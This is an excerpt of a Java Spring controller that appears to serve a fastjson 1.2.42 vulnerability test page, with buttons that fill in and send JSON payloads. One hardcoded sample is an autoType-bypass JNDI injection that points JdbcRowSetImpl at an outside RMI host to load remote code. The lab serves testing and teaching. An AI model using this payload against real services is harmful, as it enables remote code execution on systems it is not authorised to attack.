...
public class FastjsonController {
    ...
    @GetMapping(value = {"/", "/fastjson-1.2.42"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage(
                "fastjson-1.2.42 靶场测试页",
                "/fastjson1.2.42-process",
                new String[]{
                        "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://fastjson1_2_42_attack.dnslog.cn/Exploit\", \"autoCommit\":true}"
                },
                "{\"name\":\"123\",\"email\":\"123@123\",\"age\":\"123\"}"
        );
    }

    @PostMapping("/fastjson1.2.42-process")
    public String fastjson1_2_42_process(@RequestBody String data) {
    ...
    private String buildPage(String title, String processPath, String[] attackPayloads, String normalPayload) {
        ...
        for (int i = 0; i < attackPayloads.length; i++) {
            attackButtons.append("<button type=\"button\" class=\"attack\" onclick=\"fillAttack(")
                    .append(i)
                    .append(")\">填充攻击 Payload ")
                    .append(i + 1)
                    .append("</button>");
        ...
        return "<!DOCTYPE html><html lang=\"zh-CN\"><head><meta charset=\"UTF-8\"><title>" + title + "</title>" +
                ...
                "<p class=\"hint\">可以先填充 vul.py 中的攻击或正常样例，再手动修改 payload，然后发送到 <code>" + processPath + "</code>。</p>" +
                "<label for=\"payload\">当前 payload</label><textarea id=\"payload\">" + escapeHtml(normalPayload) + "</textarea>" +
                "<div class=\"actions\">" + attackButtons +
                "<button type=\"button\" class=\"normal\" onclick=\"fillNormal()\">填充正常 Payload</button>" +
                "<button type=\"button\" class=\"send\" onclick=\"sendCurrent()\">发送当前 Payload</button></div>" +
                "<label for=\"result\">响应结果</label><pre id=\"result\">等待发送请求...</pre></div>" +
                "<script>const attackPayloads=" + toJsArray(attackPayloads) + ";" +
                "const normalPayload='" + escapeForJs(normalPayload) + "';" +
                "const processPath='" + processPath + "';" +
                "const payloadBox=document.getElementById('payload');const resultBox=document.getElementById('result');" +
                "function fillAttack(index){payloadBox.value=attackPayloads[index];}" +
                "function fillNormal(){payloadBox.value=normalPayload;}" +
                "async function sendCurrent(){const payload=payloadBox.value;resultBox.textContent='当前 payload 请求发送中...';" +
                "try{const response=await fetch(processPath,{method:'POST',headers:{'Content-Type':'application/json'},body:payload});" +
    ...
    private String toJsArray(String[] payloads) {
        StringBuilder builder = new StringBuilder("[");
        for (int i = 0; i < payloads.length; i++) {
            if (i > 0) {
                builder.append(",");
            }
            builder.append("'").append(escapeForJs(payloads[i])).append("'");
        }
        builder.append("]");
